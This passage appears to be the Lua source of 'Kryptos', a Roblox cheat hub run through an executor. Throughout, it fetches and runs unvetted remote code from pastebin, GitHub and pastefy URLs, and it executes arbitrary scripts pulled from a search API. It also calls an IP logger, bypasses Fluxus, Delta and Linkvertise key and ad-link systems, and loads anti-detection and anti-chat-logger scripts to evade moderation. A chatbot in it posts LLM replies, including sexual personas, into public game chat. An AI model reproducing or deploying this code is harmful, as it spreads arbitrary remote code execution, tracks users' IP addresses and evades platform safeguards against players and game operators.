InfoTab:AddButton({
    Name = "Copy Accountage",
    Callback = function()
        setclipboard(tostring(SelectedPlayerAccountAge))
    end
})

UpdatePlayerDropdown()
GetSelectedPlayerInfo()

--[] Kryptos | Suggestions

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "P Shade"
})
--[] Seperator

MiscTab:AddDropdown({
	Name = "P Shade Options",
	Default = "Midday lite",
	Options = {
	  "Morning", 
	  "Midday", 
	  "Afternoon", 
	  "Evening",
	  "Night",
	  "Midnight",
	  "Morning lite", 
	  "Midday lite", 
	  "Afternoon lite", 
	  "Evening lite",
	  "Night lite",
	  "Midnight lite"
	},
	Callback = function(Value)
		getgenv().RTX_Name = Value
	end    
})

MiscTab:AddButton({
	Name = "Load P Shade",
	Callback = function()
	  loadstring(game:HttpGet('https://pastefy.app/xXkUxA0P/raw', true))()
  end    
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Shaders"
})
--[] Seperator

MiscTab:AddButton({
	Name = "Zaptosis Shader",
	Callback = function()
    loadstring(game:HttpGet('https://pastebin.com/raw/6ubafXBz'))()
  end    
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Game Teleporter"
})
--[] Seperator
local games = {
    ["3008"] = 2768379856,
    ["A Dusty Trip"] = 16389395869,
    ["Ability Wars"] = 8260276694,
    ["Adopt and Raise a Baby"] = 383793228,
    ["Adopt Me!"] = 920587237,
    ["Animal Race"] = 17360443692,
    ["Animal Speed Race"] = 17434340300,
    ["Anime Fighters Simulator"] = 6299805723,
    ["Apocalypse Rising 2"] = 863266079,
    ["Bad Business"] = 3233893879,
    ["Basketball Legends"] = 14259168147,
    ["Bedwars"] = 6872265039,
    ["Bee Swarm Simulator"] = 1537690962,
    ["Blade Ball"] = 13772394625,
    ["Blox Fruits"] = 2753915549,
    ["Boxing League"] = 3738091713,
    ["Breaking Point"] = 648362523,
    ["Build A Boat For Treasure"] = 537413528,
    ["Combat Warriors"] = 4282985734,
    ["Counter Blox"] = 301549746,
    ["Criminality"] = 4588604953,
    ["Da Hood"] = 2788229376,
    ["Doors"] = 6516141723,
    ["Driving Empire"] = 3351674303,
    ["Drive World"] = 10704789056,
    ["Evade"] = 9872472334,
    ["Fights in School"] = 17698425045,
    ["Fling Things and People"] = 6961824067,
    ["Frontlines"] = 5938036553,
    ["Godswill"] = 12826178482,
    ["Gym League"] = 17450551531,
    ["Horrific Housing"] = 26263761432,
    ["Heroes Battleground"] = 13076380114,
    ["Hoopz"] = 6229116934,
    ["Item Asylum"] = 5670218884,
    ["Jail Break"] = 6068606849621,
    ["Jujutsu Shenanigans"] = 9391468976,
    ["KAT"] = 621129760,
    ["Launch into Space Simulator"] = 15535115259,
    ["Lumber Tycoon 2"] = 13822889,
    ["Lucky Block"] = 662417684,
    ["Mic Up"] = 6884319169,
    ["Murder Mystery 2"] = 142823291,
    ["Murderer vs Sheriff"] = 12355337193,
    ["Murderer vs Sheriff Duels"] = 12355337193,
    ["Muscle Legends"] = 3623096087,
    ["Natural Disaster Survival"] = 189707,
    ["Nico's Nextbots"] = 10118559731,
    ["Plates of Fate Remastered"] = 864984217,
    ["Redwood Prison"] = 919623646,
    ["Royal High"] = 735030788,
    ["Skywars"] = 855499080,
    ["Slap Battles"] = 6403373529,
    ["Spray Paint"] = 9456350429,
    ["The Day Before The Dawn"] = 6985184673,
    ["TOH"] = 1962086868,
    ["Undertale Crazy Multiverse Timeline"] = 9846910264,
    ["Untitled Tag Game"] = 11763012139,
    ["Vampire Hunters 3"] = 3550586365,
    ["Work at a Pizza Place"] = 192800,
    ["Your Bizarre Adventure"] = 2809202155
}


local gameNames = {}
for name, _ in pairs(games) do
	table.insert(gameNames, name)
end

local selectedGame = nil

MiscTab:AddDropdown({
	Name = "Select Game",
	Default = "Select a game",
	Options = gameNames,
	Callback = function(Value)
		selectedGame = games[Value]
	end
})

MiscTab:AddButton({
	Name = "Teleport",
	Callback = function()
		if selectedGame then
			game:GetService("TeleportService"):Teleport(selectedGame, game:GetService("Players").LocalPlayer)
		else
			print("No game selected")
		end
	end
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Load's"
})
--[] Seperator

MiscTab:AddParagraph("Suggestion UI", "DISCLAIMER : When suggestion UI is loaded we will log your ip for secruity purposes.")

MiscTab:AddButton({
	Name = "Load Suggestion Ui",
	Callback = function()
		loadstring(game:HttpGet('https://github.com/RENBex6969/OfficialKryptos/raw/main/Suggestion.lua'))()
		IPLogger()
	end
})

MiscTab:AddButton({
	Name = "Load Toggle Ui",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/qyFBKExn"))()
	end
})

MiscTab:AddButton({
	Name = "Load Changelogs Ui",
	Callback = function()
		loadstring(game:HttpGet(""))()
	end
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Music Player"
})
--[] Seperator

if not isfolder("MusicFolder") then
  makefolder("MusicFolder")
end

MiscTab:AddParagraph("How to work","Go to your song into your executor workspace and look for the folder named 'MusicFolder', then put your song into it. If there is not a folder named musicFolder create your own! ")
MiscTab:AddParagraph("IMPORTANT","Remove any special characters frrom the file name not the file extenstion!\n\nAllowed Characters are _ and the alphabet")

local musicFolder = "MusicFolder"
local musicTable
local musicFiles = {}
local selectedMusic
local currentSound
local volume = 500

for _, file in pairs(listfiles(musicFolder)) do
	if file:match("%.mp3$") or file:match("%.ogg$") or file:match("%.wav$") then
		table.insert(musicFiles, file)
	end
end

local Dropdown = MiscTab:AddDropdown({
	Name = "Select Music",
	Default = musicFiles[1],
	Options = musicFiles,
	Callback = function(Value)
		selectedMusic = Value
	end    
})

MiscTab:AddSlider({
	Name = "Volume",
	Min = 0,
	Max = 100,
	Default = volume,
	Color = Color3.fromRGB(133, 167, 143),
	Increment = 1,
	ValueName = "Volume",
	Callback = function(Value)
		volume = Value / 100
		print("Volume set to: " .. Value)
		if currentSound then
			currentSound.Volume = volume
		end
	end    
})

MiscTab:AddButton({
	Name = "Play Music",
	Callback = function()
		if selectedMusic then
			if currentSound then
				currentSound:Stop()
				currentSound:Destroy()
			end
			currentSound = Instance.new("Sound", game)
			currentSound.SoundId = getsynasset(selectedMusic)
			currentSound.Volume = volume
			currentSound:Play()
	
		else
			print("No music selected.")
		end
	end    
})

MiscTab:AddButton({
	Name = "Stop Music",
	Callback = function()
		if currentSound then
			currentSound:Stop()
			currentSound:Destroy()
			currentSound = nil
		else
			print("No music is currently playing.")
		end
	end    
})

MiscTab:AddLabel("Music Downloader")

local MusicDownloadURL

MiscTab:AddTextbox({
	Name = "URL",
	Default = "Enter URL",
	TextDisappear = false,
	Callback = function(Value)
		MusicDownloadURL = Value
	end	  
})

MiscTab:AddButton({
	Name = "Download",
	Callback = function()
	  if not MusicDownloadURL == "" then
	  OrionLib:MakeNotification({
	    Name = "Notice",
	    Content = "Song is being downloaded",
	    Image = "rbxassetid://4483345998",
	    Time = 5
	  })
	  writefile("MusicFolder/song" .. math.random(1, 1000) .. ".mp3", tostring(game:HttpGet(MusicDownloadURL)))
	  end
  end    
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Script Searcher GUI's"
})
--[] Seperator

MiscTab:AddButton({
	Name = "Searcher 1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
  end    
})

MiscTab:AddButton({
	Name = "Searcher 2",
	Callback = function()
	  setclipboard("use your chrome [:")
  end    
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Script Searcher Kryptos"
})
--[] Seperator

MiscTab:AddParagraph("Scriptblox","Uses the scriptblox api!")


local currentIndex = 1
local scripts = {}

local scriptLabelone = MiscTab:AddLabel("Script Title")
local scriptLabeltwo = MiscTab:AddLabel("Script")

local function updateParagraph(index)
  if scripts[index] then
    local scriptTitle = scripts[index].title
    local scriptContent = scripts[index].script

    scriptLabelone:Set(scriptTitle)
    scriptLabeltwo:Set(scriptContent)
  else
    scriptLabelone:Set("No Scripts Found")
  end
end

local function searchScripts(query)
  local url = "https://scriptblox.com/api/script/search?q=" .. query .. "&script%20name=5&mode=free"
  local response = game:HttpGet(url)
  local data = game:GetService("HttpService"):JSONDecode(response)
  scripts = data.result.scripts
  currentIndex = 1
  updateParagraph(currentIndex)
end

local searchScriptsValue

MiscTab:AddTextbox({
  Name = "Enter Search Query",
  Default = "",
  TextDisappear = false,
  Callback = function(value)
   searchScriptsValue = value
 end
})

MiscTab:AddButton({
 Name = "Search",
 Callback = function()
  searchScripts(searchScriptsValue)
 end
})

MiscTab:AddButton({
  Name = "Execute Script",
  Callback = function()
    if scripts[currentIndex] and scripts[currentIndex].script then
      loadstring(scripts[currentIndex].script)()
    end
  end
})

MiscTab:AddButton({
  Name = "Previous Script",
  Callback = function()
    if currentIndex < #scripts then
      currentIndex = currentIndex - 1
      updateParagraph(currentIndex)
    else
      scriptParagraph:Set("End of Scripts\nYou have reached the end of the script list.")
    end
  end
})

MiscTab:AddButton({
  Name = "Next Script",
  Callback = function()
    if currentIndex < #scripts then
      currentIndex = currentIndex + 1
      updateParagraph(currentIndex)
    else
      scriptParagraph:Set("End of Scripts\nYou have reached the end of the script list.")
    end
  end
})

MiscTab:AddButton({
  Name = "Copy Script",
  Callback = function()
    setclipboard(scriptContent)
  end
})

--[] Seperator
local Section = MiscTab:AddSection({
    Name = "Obfuscation Tools"
})

local inputText = ""
--[] Seperator

function obfuscateBytecode(input)
    -- Remove unnecessary whitespace
    input = input:gsub("%s+", "")
    -- Encode each character to its ASCII value
    local encoded = input:gsub(".", function(bb) return "\\" .. bb:byte() end) or input .. "\""
    return encoded
end

MiscTab:AddParagraph("Bytecode Obfuscator","Not quite secure obfuscator but should do the trick to skiddies!")

MiscTab:AddTextbox({
    Name = "Script Input",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        inputText = Value
    end
})

MiscTab:AddButton({
    Name = "Obfuscate and Copy",
    Callback = function()
        local obfuscatedBytecode = obfuscateBytecode(inputText)
        finalObfuscatedCode = string.format('__Kryptos__ = \'Obfuscated by usingKryptos\'\nloadstring("%s")()', obfuscatedBytecode)
        setclipboard(finalObfuscatedCode)
        print("Code obfuscated and copied to clipboard!")
    end    
})

MiscTab:AddButton({
    Name = "Tester",
    Callback = function()
      loadstring(finalObfuscatedCode)()
  end    
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Password Generator"
})
--[] Seperator
passwordlength = 12

MiscTab:AddParagraph("Password Generator", "Password will not be shown because the set paragraph is being a bit messy")

MiscTab:AddTextbox({
    Name = "Password Length",
    Default = "12",
    TextDisappear = false,
    Callback = function(value)
        passwordlength = tonumber(value) or passwordlength
    end
})

MiscTab:AddButton({
    Name = "Generate Password",
    Callback = function()
        local length = passwordlength
        if not length then
            print("Please enter a valid number for password length.")
            return
        end
        local url = "https://api.genratr.com/?length=" .. length .. "&uppercase&lowercase&special&numbers"
        local response = game:HttpGet(url)
        local success, decoded = pcall(function()
            return game.HttpService:JSONDecode(response)
        end)
        
        if success then
            randomPassword = decoded.password
        else
            print("Failed to decode JSON response:", decoded)
        end
    end
})

MiscTab:AddButton({
  Name = "Copy Password",
  Callback = function()
    setclipboard(randomPassword)
  end
})

--[] Seperator
local Section = MiscTab:AddSection({
	Name = "Bypass Links"
})
--[] Seperator

MiscTab:AddDropdown({
	Name = "API Selection",
	Default = "Kazi API",
	Options = {"Kazi", "GoatBy"},
	Callback = function(Value)
		if Value == "Bypassi API" then
		  baseURLBypass = "https://kazi-api.vercel.app/api/bypass?link="
		elseif Value == "GoatBypasser" then
		  baseURLBypass = "https://bypassi.goatbypassers.xyz/?url="
		else
		  print("[LOG] Invalid")
		end
	end    
})

MiscTab:AddParagraph("Supported Key System Links", "Fluxus Key,  Delta Key, Hydrogen Key, VegaX Key, Bananahub Key, Every Key system that is platoboost,")

MiscTab:AddParagraph("Supported Ad-links", "Linkvertise")

MiscTab:AddParagraph("Usage", "After bypassing check the console!")

MiscTab:AddTextbox({
    Name = "Place what you wanna bypass",
    Default = "Link here!",
    TextDisappear = false,
    Callback = function(Value)
        UserInput = Value
    end
})

MiscTab:AddButton({
    Name = "Bypass",
    Callback = function()
        if UserInput == "" then
            warn("Enter Valid Link")
            return
        end
        local fullURL = baseURLBypass .. UserInput
        if fetchAndParseBypass(fullURL) then
            StarterGui:SetCore("DevConsoleVisible", true)
        end
    end
})

MiscTab:AddButton({
    Name = "Copy Status",
    Callback = function()
        setclipboard(parsedStatus)
        print("Status copied to clipboard")
    end
})

MiscTab:AddButton({
    Name = "Copy Key",
    Callback = function()
        setclipboard(parsedKey)
        print("Key copied to clipboard")
    end
})

MiscTab:AddButton({
    Name = "Copy Time",
    Callback = function()
        setclipboard(parsedTime)
        print("Time copied to clipboard")
    end
})

MiscTab:AddButton({
    Name = "Copy Message",
    Callback = function()
        setclipboard(parsedMessage)
        print("Message copied to clipboard")
    end
})



AI = {
  ["AI_ENABLED"] = "false",
  ["Characteristic"] = "Normal",
  ["AI_CharacterLIMIT"] = "45",
  ["AI_Prefix"] = "[AI]: ",
  ["AI_Language"] = "English",
  ["AI_Range"] = "20",
  ["AI_WalkToPlayer"] = true,
}

API = {
  ["API_ENDPOINT"] = "https://iknoxteam.pythonanywhere.com/api/data?prompt=",
  ["API_MODEL"] = "llama3-8b-8192",
  ["KEY"] = ""
}

-- // Variables
TCS = game:GetService("TextChatService")
CoreGui = game:GetService("CoreGui")
RStorage = game:GetService("ReplicatedStorage")
Players = game:GetService("Players")
TweenService = game:GetService("TweenService")
HttpService = game:GetService("HttpService")
UserInputService = game:GetService("UserInputService")
LocalPlayer = Players.LocalPlayer
PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
isLegacy = TCS.ChatVersion == Enum.ChatVersion.LegacyChatService
ChatBar = CoreGui:FindFirstChild("TextBoxContainer", true) or PlayerGui:FindFirstChild("Chat"):FindFirstChild("ChatBar", true)

ChatBar = ChatBar and ChatBar:FindFirstChild("TextBox") or ChatBar

memoryTable = {}

function getMemory(key)
    return memoryTable[key] or ""
end

function updateMemory(key, value)
    memoryTable[key] = value
end

function communicateWithAI(memory, prompt, value, apikey, PlayerSaidBy)
    AILimitCharacter = AI.AI_CharacterLIMIT
    if value == "NoLimit" then
      AILimitCharacter = 999999
    end
    PlayerSaidBy = tostring(PlayerSaidBy) or "User"
    AIMemory = getMemory("last_prompt")
    apiUrl = tostring(API.API_ENDPOINT .. prompt .. "&content2=" .. AI.Characteristic .. "&limitcharacter=" .. AILimitCharacter .. "&accountid=" .. API.KEY .. "&model=" .. API.API_MODEL .. "&language=" .. AI.AI_Language .. "&name=" .. PlayerSaidBy)
    if memory == true then
      apiUrl = tostring(API.API_ENDPOINT .. "Last Prompt : " .. AIMemory .. " New Prompt : " .. prompt .. "&content2=" .. AI.Characteristic .. "&limitcharacter=" .. AILimitCharacter .. "&accountid=" .. API.KEY .. "&model=" .. API.API_MODEL .. "&language=" .. AI.AI_Language .. "&name=" .. PlayerSaidBy)
    end
    updateMemory("last_prompt",prompt)
    local response
    success, errorMessage = pcall(function()
        response = game:HttpGet(apiUrl)
    end)
    if success then
        responseData = HttpService:JSONDecode(response)
        aiMessage = responseData.choices[1].message.content
        return aiMessage
    else
        return "Error: " .. errorMessage
    end
end

function sendMSG(msg)
    if isLegacy then
        ChatRemote = RStorage:FindFirstChild("SayMessageRequest", true)
        if ChatRemote then
            ChatRemote:FireServer(AI.AI_Prefix .. msg, "All")
        end
    else
        Channel = TCS.TextChannels.RBXGeneral
        if Channel then
            Channel:SendAsync(AI.AI_Prefix .. msg)
        end
    end
end

function isWithinRadius(position1, position2, radius)
    return (position1 - position2).magnitude <= radius
end

function over45letter(text)
  if #text > 45 then
    return true
  else
    return false
  end
end

function moveToPlayerAndRotate(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        playerPosition = player.Character.HumanoidRootPart.Position
        localPlayerPosition = LocalPlayer.Character.HumanoidRootPart.Position
        
        if AI.AI_WalkToPlayer == true then
            walkSpeed = 16
            distance = (playerPosition - localPlayerPosition).Magnitude
            while distance > 5 do
                direction = (playerPosition - localPlayerPosition).Unit
                localPlayerPosition = localPlayerPosition + direction * walkSpeed * wait(0.1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(localPlayerPosition, playerPosition)
                distance = (playerPosition - localPlayerPosition).Magnitude
            end
        end
        direction = (playerPosition - localPlayerPosition).Unit
        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.lookAt(localPlayerPosition, playerPosition)
    end
end

function onPlayerChatted(player, message)
    if AI.AI_ENABLED == true then
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            playerPosition = player.Character.HumanoidRootPart.Position
            if isWithinRadius(playerPosition, LocalPlayer.Character.HumanoidRootPart.Position, tonumber(AI.AI_Range)) then
                direction = (playerPosition - LocalPlayer.Character.HumanoidRootPart.Position).Unit
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.lookAt(LocalPlayer.Character.HumanoidRootPart.Position, playerPosition)
                
                MSG = communicateWithAI(true, message, "45", API.CLIENT_APIKEY, player.Name)
                if over45letter(MSG) == true then
                  sendMSG("Response to " .. player.name .. " is too long!")
                else
                  sendMSG(MSG)
                end
            end
        end
    end
end

function waitForCharacter()
    while not LocalPlayer.Character do
        wait()
    end
    while not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") do
        wait()
    end
end

waitForCharacter()

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(message)
            onPlayerChatted(player, message)
        end)
    end
end

AiTab:AddToggle({
    Name = "Toggle AI - On / Off",
    Default = false,
    Callback = function(Value)
        AI.AI_ENABLED = Value
    end    
})

AiTab:AddDropdown({
    Name = "Characters",
    Default = "Normal",
    Options = {
        "Normal", 
        "Formal",
        "Doctor",
        "Lawyer",
        "Engineer",
        "Scientist",
        "Essay Writer",
        "Horny girl",
        "Horny man",
        "Slutty girl",
        "Slutty man",
        "Sex ED Teacher",
        "Classy",
        "Formal Classy",
        "Drunk Classy",
        "Drunk man",
        "Drunk Nerd",
        "Nerd",
        "Almighty Jesus",
        "Almighty God",
        "Almighty Allah",
        "Gay Furry",
        "Furry",
    },
    Callback = function(Value)
        AI.Characteristic = Value
    end    
})

AiTab:AddDropdown({
    Name = "AI Language",
    Default = "English",
    Options = {
      "English",
      "Russian",
      "Hindi",
      "Portuguess",
      "Spanish",
      "Mandarin Chinese",
      "Bengali",
      "French",
      "Arabic",
      "Japanese",
      "German",
      "Korean",
      "Tagalog",
      "Marathi"
    },
    Callback = function(Value)
        AI.AI_Language = Value
    end    
})

AiTab:AddTextbox({
	Name = "AI Range",
	Default = AI.AI_Range,
	TextDisappear = false,
	Callback = function(Value)
	  AI.AI_Range = Value
	end	  
})

AiTab:AddToggle({
    Name = "AI Walk to player",
    Default = false,
    Callback = function(Value)
      AI.AI_WalkToPlayer = Value
  end    
})

Section = AiTab:AddSection({
	Name = "Custom Message Prefix"
})

AiTab:AddDropdown({
	Name = "Message Prefix",
	Default = AI.AI_Prefix,
	Options = {AI.AI_Prefix, "No Message Prefix"},
	Callback = function(Value)
		if Value == "No Message Prefix" then
		  AI.AI_Prefix = ""
		else
		  AI.AI_Prefix = "[AI]: "
		end
	end    
})

AiTab:AddToggle({
	Name = "Allow Message Prefix",
	Default = false,
	Callback = function(Value)
	  if Value == false then
		  AllowCustomMessagePrefix = true
		else
		  AllowCustomMessagePrefix = false
		end
	end    
})

AiTab:AddTextbox({
	Name = "Custom Message Prefix",
	Default = AI.AI_Prefix,
	TextDisappear = false,
	Callback = function(Value)
	  if AllowCustomMessagePrefix == true then
		  AI.AI_Prefix = Value
		end
	end	  
})

Section = AiTab:AddSection({
	Name = "Custom Character"
})

AiTab:AddToggle({
	Name = "Allow Custom Character",
	Default = false,
	Callback = function(Value)
	  if Value == false then
		  AllowCustomCharacter = true
		else
		  AllowCustomCharacter = false
		end
	end    
})

AiTab:AddTextbox({
	Name = "Custom Character",
	Default = AI.Characteristic,
	TextDisappear = false,
	Callback = function(Value)
	  if AllowCustomCharacter == true then
		  AI.Characteristic = Value
		end
	end	  
})

Section = AiTab:AddSection({
	Name = "Chat Section"
})

conversationHistory = ""

AiresponseParagraph = AiTab:AddParagraph("Conversation AI", conversationHistory)

AiTab:AddTextbox({
	Name = "Message",
	Default = "Hello AI",
	TextDisappear = false,
	Callback = function(Value)
		AIMessage = communicateWithAI("yes", Value, "NoLimit", API.CLIENT_APIKEY, tostring(Players.LocalPlayer.Name))
		conversationHistory = conversationHistory .. "\n\nUser : " .. Value .. "\n\nAI: " .. AIMessage
		AiresponseParagraph:Set(conversationHistory)
	end	  
})

AiTab:AddButton({
	Name = "Clear AI Messages",
	Callback = function()
	  conversationHistory = ""
	  AiresponseParagraph:Set("Conversation AI","")
  end    
})

AiTab:AddButton({
	Name = "Reset AI Memory",
	Callback = function()
	  AIMemory = "You dont remember anything!"
  end    
})

AiTab:AddButton({
	Name = "Copy to clipboard AI Message",
	Callback = function()
	  setclipboard(AIMessage)
  end    
})

AiTab:AddDropdown({
    Name = "Characters",
    Default = "Normal",
    Options = {
        "Normal", 
        "Formal",
        "Doctor",
        "Lawyer",
        "Engineer",
        "Scientist",
        "Lua Programmer",
        "Roblox Lua Programmer",
        "Essay Writer",
        "Horny girl",
        "Horny man",
        "Slutty girl",
        "Slutty man",
        "Sex ED Teacher",
        "Classy",
        "Formal Classy",
        "Drunk Classy",
        "Drunk man",
        "Drunk Nerd",
        "Nerd",
        "Almighty Jesus",
        "Almighty God",
        "Almighty Allah",
        "Gay Furry",
        "Furry",
    },
    Callback = function(Value)
        AI.Characteristic = Value
    end    
})

AiTab:AddDropdown({
    Name = "AI Language",
    Default = "English",
    Options = {
      "English",
      "Russian",
      "Hindi",
      "Portuguess",
      "Spanish",
      "Mandarin Chinese",
      "Bengali",
      "French",
      "Arabic",
      "Japanese",
      "German",
      "Korean",
      "Tagalog",
      "Marathi"
    },
    Callback = function(Value)
        AI.AI_Language = Value
    end    
})

Section = AiTab:AddSection({
	Name = "Tweaks Section"
})

AiTab:AddParagraph("GROQ API","Allows you to use your own Groq API key. If our api isnt working.")

AiTab:AddTextbox({
	Name = "Groq API",
	Default = "Nothing",
	TextDisappear = false,
	Callback = function(Value)
		API.CLIENT_APIKEY = Value
	end	  
})

AiTab:AddButton({
	Name = "Reset",
	Callback = function()
	  API.CLIENT_APIKEY = "Nothing"
  end    
})

Section = AiTab:AddSection({
	Name = "Ai Models"
})

AiTab:AddParagraph("Model","Allows you to select a Ai Model! ")

AiTab:AddDropdown({
    Name = "Model",
    Default = "llama3-8b-8192",
    Options = {
        "llama3-70b-8192",
        "llama3-8b-8192",
        "llama-3.1-70b-versatile",
        "llama3-8b-8192",
        "gemma-7b-it",
        "gemma2-9b-it"
    },
    Callback = function(Value)
        API.API_MODEL = Value
    end    
})

loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/main/Anti-Chat-Logger", true))()

--[] Agruments
OrionLib:Init()

--[] Protection Function
function Protection()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20GUI%20Detection.lua"))()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/Anti%20Instance%20Detector.lua"))()
end
Protection()
